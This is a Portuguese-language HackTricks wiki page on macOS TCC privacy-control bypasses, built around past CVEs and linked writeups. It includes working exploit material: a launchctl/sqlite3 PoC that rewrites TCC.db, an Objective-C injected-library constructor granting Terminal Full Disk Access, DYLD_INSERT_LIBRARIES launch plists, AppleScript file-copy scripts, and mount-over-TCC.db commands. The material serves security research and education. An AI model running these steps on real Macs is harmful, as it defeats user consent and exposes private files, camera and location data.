# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Por funcionalidade

### Write Bypass

Isto não é um bypass, é apenas a forma como o TCC funciona: **ele não protege contra escrita**. Se o Terminal **não tiver acesso para ler o Desktop de um usuário, ainda poderá escrever nele**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
O **extended attribute `com.apple.macl`** é adicionado ao novo **file** para dar ao **creators app** acesso para lê-lo.

### TCC ClickJacking

É possível **colocar uma janela sobre o prompt do TCC** para fazer o usuário **aceitá-lo** sem perceber. Você pode encontrar um PoC em [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

O atacante pode **criar apps com qualquer nome** (por exemplo, Finder, Google Chrome...) no **`Info.plist`** e fazê-los solicitar acesso a algum local protegido pelo TCC. O usuário pensará que o aplicativo legítimo é o que está solicitando esse acesso.\
Além disso, é possível **remover o app legítimo do Dock e colocar o falso nele**; assim, quando o usuário clicar no falso (que pode usar o mesmo ícone), ele poderá chamar o legítimo, solicitar permissões do TCC e executar um malware, fazendo o usuário acreditar que o app legítimo solicitou o acesso.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Mais informações e PoC em:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Por padrão, um acesso via **SSH costumava ter "Full Disk Access"**. Para desabilitar isso, é necessário que ele esteja listado, mas desabilitado (removê-lo da lista não removerá esses privilégios):

![TCC Request by arbitrary name - SSH Bypass: Por padrão, um acesso via SSH costumava ter "Full Disk Access". Para desabilitar isso, é necessário que ele esteja listado, mas desabilitado (removê-lo...](<../../../../../images/image (1077).png>)

Aqui você encontra exemplos de como alguns **malwares conseguiram contornar essa proteção**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Observe que agora, para poder habilitar o SSH, você precisa de **Full Disk Access**

### Handle extensions - CVE-2022-26767

O atributo **`com.apple.macl`** é atribuído a arquivos para dar a **um determinado aplicativo permissões para lê-los.** Esse atributo é definido quando se faz **drag\&drop** de um arquivo sobre um app ou quando um usuário **clica duas vezes** em um arquivo para abri-lo com o **aplicativo padrão**.

Portanto, um usuário poderia **registrar um app malicioso** para lidar com todas as extensões e chamar o Launch Services para **abrir** qualquer arquivo (assim, o arquivo malicioso receberá acesso para lê-lo).

### iCloud

O entitlement **`com.apple.private.icloud-account-access`** permite comunicar-se com o serviço XPC **`com.apple.iCloudHelper`**, que **fornecerá tokens do iCloud**.

**iMovie** e **Garageband** tinham esse entitlement e outros que permitiam isso.

Para obter mais **informações** sobre o exploit para **obter tokens do iCloud** a partir desse entitlement, consulte a palestra: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Um app com a permissão **`kTCCServiceAppleEvents`** poderá **controlar outros Apps**. Isso significa que ele poderá **abusar das permissões concedidas aos outros Apps**.

Para obter mais informações sobre Apple Scripts, consulte:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Por exemplo, se um App tiver **permissão de Automation sobre o `iTerm`**, neste exemplo o **`Terminal`** tem acesso ao iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

O Terminal, que não possui FDA, pode chamar o iTerm, que possui essa permissão, e usá-lo para executar ações:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Através do Finder

Ou, se um aplicativo tiver acesso através do Finder, ele poderia executar um script como este:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Por comportamento do App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

O **tccd daemon** em userland usava a variável de ambiente **`HOME`** para acessar o banco de dados de usuários do TCC em: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

De acordo com [este post no Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), e como o daemon do TCC é executado pelo **`launchd`** no domínio do usuário atual, é possível **controlar todas as variáveis de ambiente** transmitidas a ele.\
Assim, um **atacante poderia definir a variável de ambiente `$HOME`** no **`launchctl`** para apontar para um **diretório** **controlado**, **reiniciar** o daemon do **TCC** e, então, **modificar diretamente o banco de dados do TCC** para conceder a si mesmo **todos os TCC entitlements disponíveis**, sem nunca exibir um prompt ao usuário final.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes tinha acesso a locais protegidos pelo TCC, mas, quando uma nota é criada, ela é **criada em um local não protegido**. Portanto, era possível pedir ao Notes para copiar um arquivo protegido para uma nota (ou seja, para um local não protegido) e depois acessar o arquivo:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

O binário `/usr/libexec/lsd`, com a library `libsecurity_translocate`, possuía o entitlement `com.apple.private.nullfs_allow`, que permitia criar um mount **nullfs**, e possuía o entitlement `com.apple.private.tcc.allow` com **`kTCCServiceSystemPolicyAllFiles`** para acessar qualquer arquivo.

Era possível adicionar o atributo de quarentena a "Library", chamar o serviço XPC **`com.apple.security.translocation`** e, então, ele mapearia Library para **`$TMPDIR/AppTranslocation/d/d/Library`**, onde todos os documentos dentro de Library poderiam ser **acessados**.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** tem uma funcionalidade interessante: quando está em execução, ele **importa** os arquivos colocados em **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** para a "media library" do usuário. Além disso, ele chama algo como: **`rename(a, b);`**, onde `a` e `b` são:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

Esse comportamento de **`rename(a, b);`** é vulnerável a uma **Race Condition**, pois é possível colocar um arquivo **TCC.db** falso dentro da pasta `Automatically Add to Music.localized` e, quando a nova pasta (b) for criada para copiar o arquivo, excluí-lo e apontá-lo para **`~/Library/Application Support/com.apple.TCC`**/.
**Mais informações** [**no writeup**](https://gergelykalman.com/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV.html)


### SQLITE_SQLLOG_DIR - CVE-2023-32422

Se **`SQLITE_SQLLOG_DIR="path/folder"`** estiver definido, isso basicamente significa que **qualquer db aberta é copiada para esse caminho**. Neste CVE, esse controle foi abusado para **escrever** dentro de um **banco de dados SQLite** que será **aberto por um processo com FDA, o banco de dados do TCC**, e então abusar de **`SQLITE_SQLLOG_DIR`** com um **symlink no nome do arquivo**, de modo que, quando esse banco de dados for **aberto**, o `TCC.db` do usuário seja sobrescrito pelo banco aberto.\
**Mais informações** [**no writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **e**[ **na talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Se a variável de ambiente **`SQLITE_AUTO_TRACE`** estiver definida, a library **`libsqlite3.dylib`** começará a **registrar** todas as queries SQL. Muitas aplicações usavam essa library, portanto era possível registrar todas as suas queries SQLite.

Vários aplicativos da Apple usavam essa library para acessar informações protegidas pelo TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Esta **env variable é usada pelo framework `Metal`**, que é uma dependência de vários programas, principalmente do `Music`, que possui FDA.

Definindo o seguinte: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Se `path` for um diretório válido, o bug será acionado e podemos usar `fs_usage` para ver o que está acontecendo no programa:

- um arquivo será aberto com `open()`, chamado `path/.dat.nosyncXXXX.XXXXXX` (X é aleatório)
- uma ou mais chamadas `write()` escreverão o conteúdo no arquivo (não controlamos isso)
- `path/.dat.nosyncXXXX.XXXXXX` receberá `rename()` para `path/name`

É uma escrita em arquivo temporário, seguida por um **`rename(old, new)`** **que não é seguro.**

Não é seguro porque precisa **resolver os caminhos antigo e novo separadamente**, o que pode levar algum tempo e ser vulnerável a uma Race Condition. Para mais informações, consulte a função `renameat_internal()` do `xnu`.

> [!CAUTION]
> Basicamente, se um processo privilegiado estiver renomeando algo a partir de uma pasta que você controla, você poderia obter uma RCE e fazê-lo acessar um arquivo diferente ou, como neste CVE, abrir o arquivo criado pelo app privilegiado e armazenar um FD.
>
> Se o rename acessar uma pasta que você controla, enquanto você tiver modificado o arquivo de origem ou possuir um FD para ele, altere o arquivo (ou pasta) de destino para apontar para um symlink, permitindo escrever quando quiser.

Este foi o ataque usado no CVE. Por exemplo, para sobrescrever o `TCC.db` do usuário, podemos:

- criar `/Users/hacker/ourlink` apontando para `/Users/hacker/Library/Application Support/com.apple.TCC/`
- criar o diretório `/Users/hacker/tmp/`
- definir `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- acionar o bug executando o `Music` com esta env variable
- capturar o `open()` de `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X é aleatório)
- aqui também fazemos `open()` deste arquivo para escrita e mantemos o file descriptor aberto
- alternar atomicamente `/Users/hacker/tmp` com `/Users/hacker/ourlink` **em loop**
- fazemos isso para maximizar nossas chances de sucesso, pois a race window é bastante pequena, mas perder a race tem consequências insignificantes
- aguardar um pouco
- testar se tivemos sorte
- caso contrário, executar novamente desde o início

Mais informações em [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Agora, se você tentar usar a env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE`, os apps não serão iniciados

### Apple Remote Desktop

Como root, você poderia habilitar este serviço, e o **agente ARD teria full disk access**, que poderia então ser abusado por um usuário para fazê-lo copiar um novo **TCC user database**.

## Por **NFSHomeDirectory**

O TCC usa um banco de dados na pasta HOME do usuário para controlar o acesso a recursos específicos do usuário em **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Portanto, se o usuário conseguir reiniciar o TCC com uma env variable `$HOME` apontando para uma **pasta diferente**, ele poderia criar um novo banco de dados do TCC em **/Library/Application Support/com.apple.TCC/TCC.db** e enganar o TCC para conceder qualquer permissão TCC a qualquer app.

> [!TIP]
> Observe que a Apple usa a configuração armazenada no perfil do usuário, no atributo **`NFSHomeDirectory`**, como **valor de `$HOME`**. Portanto, se você comprometer uma aplicação com permissões para modificar esse valor (**`kTCCServiceSystemPolicySysAdminFiles`**), poderá **weaponize** esta opção com um TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

A **primeira POC** usa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) e [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) para modificar a pasta **HOME** do usuário.

1. Obter um blob _csreq_ para o app-alvo.
2. Plantar um arquivo _TCC.db_ falso com o acesso necessário e o blob _csreq_.
3. Exportar a entrada do Directory Services do usuário com [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modificar a entrada do Directory Services para alterar o diretório home do usuário.
5. Importar a entrada modificada do Directory Services com [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Parar o _tccd_ do usuário e reiniciar o processo.

A segunda POC usava **`/usr/libexec/configd`**, que possuía `com.apple.private.tcc.allow` com o valor `kTCCServiceSystemPolicySysAdminFiles`.\
Era possível executar o **`configd`** com a opção **`-t`**, permitindo que um atacante especificasse um **Bundle customizado para carregar**. Portanto, o exploit **substitui** o método de alteração do diretório home do usuário por meio de **`dsexport`** e **`dsimport`** por uma **injeção de código no `configd`**.

Para mais informações, consulte o [**relatório original**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Por process injection

Existem diferentes técnicas para injetar código dentro de um processo e abusar de seus privilégios TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Além disso, o process injection mais comum encontrado para bypass do TCC ocorre por meio de **plugins (load library)**.\
Plugins são códigos adicionais, geralmente na forma de libraries ou plist, que serão **carregados pela aplicação principal** e executados em seu contexto. Portanto, se a aplicação principal tivesse acesso a arquivos restritos pelo TCC (por meio de permissões concedidas ou entitlements), o **custom code também teria esse acesso**.

### CVE-2020-27937 - Directory Utility

A aplicação `/System/Library/CoreServices/Applications/Directory Utility.app` possuía o entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, carregava plugins com a extensão **`.daplug`** e **não tinha o runtime hardened**.

Para weaponize este CVE, o **`NFSHomeDirectory`** é **alterado** (abusando do entitlement anterior) para possibilitar **assumir o controle do banco de dados TCC dos usuários** e realizar o bypass do TCC.

Para mais informações, consulte o [**relatório original**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

O binário **`/usr/sbin/coreaudiod`** possuía os entitlements `com.apple.security.cs.disable-library-validation` e `com.apple.private.tcc.manager`. O primeiro **permitia code injection**, e o segundo lhe dava acesso para **gerenciar o TCC**.

Esse binário permitia carregar **plug-ins de terceiros** a partir da pasta `/Library/Audio/Plug-Ins/HAL`. Portanto, era possível **carregar um plugin e abusar das permissões TCC** com esta POC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Para mais informações, consulte o [**relatório original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Plug-Ins da Device Abstraction Layer (DAL)

Aplicativos do sistema que abrem o stream da câmera por meio do Core Media I/O (aplicativos com **`kTCCServiceCamera`**) carregam **estes plugins no processo**, localizados em `/Library/CoreMediaIO/Plug-Ins/DAL` (não restrito pelo SIP).

Basta armazenar nessa pasta uma biblioteca com o **constructor** comum para **injetar código**.

Vários aplicativos da Apple eram vulneráveis a isso.

### Firefox

O aplicativo Firefox tinha os entitlements `com.apple.security.cs.disable-library-validation` e `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Para mais informações sobre como explorar isso facilmente, [**consulte o relatório original**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

O binário `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` tinha os entitlements **`com.apple.private.tcc.allow`** e **`com.apple.security.get-task-allow`**, o que permitia injetar código no processo e usar os privilégios do TCC.

### CVE-2023-26818 - Telegram

O Telegram tinha os entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** e **`com.apple.security.cs.disable-library-validation`**, portanto era possível abusar dele para **obter acesso às suas permissões**, como gravar usando a câmera. Você pode [**encontrar o payload no writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Observe como, para usar a variável de ambiente e carregar uma library, foi criado um **custom plist** para injetar essa library, e o **`launchctl`** foi usado para iniciá-la:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Por invocações de open

É possível invocar **`open`** mesmo em sandbox

### Scripts de Terminal

É bastante comum conceder **Full Disk Access (FDA)** ao Terminal, pelo menos em computadores usados por profissionais de tecnologia. E é possível invocar scripts **`.terminal`** usando-o.

Scripts **`.terminal`** são arquivos plist como este, com o comando a ser executado na chave **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Um aplicativo poderia gravar um script de terminal em um local como /tmp e iniciá-lo com um comando como:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Por montagem

### CVE-2020-9771 - mount_apfs TCC bypass e privilege escalation

**Qualquer usuário** (mesmo sem privilégios) pode criar e montar um snapshot do Time Machine e **acessar TODOS os arquivos** desse snapshot.\
O **único privilégio** necessário é que o aplicativo utilizado (como o `Terminal`) tenha acesso **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), que precisa ser concedido por um administrador.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Uma explicação mais detalhada pode ser [**encontrada no relatório original**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Mesmo que o arquivo do banco de dados do TCC estivesse protegido, era possível **montar sobre o diretório** um novo arquivo TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Confira o **exploit completo** no [**writeup original**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Conforme explicado no [writeup original](https://www.kandji.io/blog/macos-audit-story-part2), este CVE explorava o `diskarbitrationd`.

A função `DADiskMountWithArgumentsCommon` do framework público `DiskArbitration` realizava as verificações de segurança. No entanto, era possível contorná-la chamando diretamente o `diskarbitrationd` e, assim, usar elementos `../` no caminho e symlinks.

Isso permitia que um atacante realizasse mounts arbitrários em qualquer local, inclusive sobre o banco de dados do TCC, devido ao entitlement `com.apple.private.security.storage-exempt.heritable` do `diskarbitrationd`.

### asr

A ferramenta **`/usr/sbin/asr`** permitia copiar o disco inteiro e montá-lo em outro local, contornando as proteções do TCC.

### Location Services

Existe um terceiro banco de dados do TCC em **`/var/db/locationd/clients.plist`**, que indica quais clients têm permissão para **acessar os serviços de localização**.\
A pasta **`/var/db/locationd/` não era protegida contra o mounting de DMGs**, portanto era possível montar nosso próprio plist.

## Por startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Por grep

Em várias ocasiões, os arquivos armazenam informações sensíveis, como e-mails, números de telefone, mensagens... em locais não protegidos (o que é considerado uma vulnerabilidade pela Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Isso não funciona mais, mas [**funcionava no passado**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Outra forma usando [**eventos do CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Referência

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
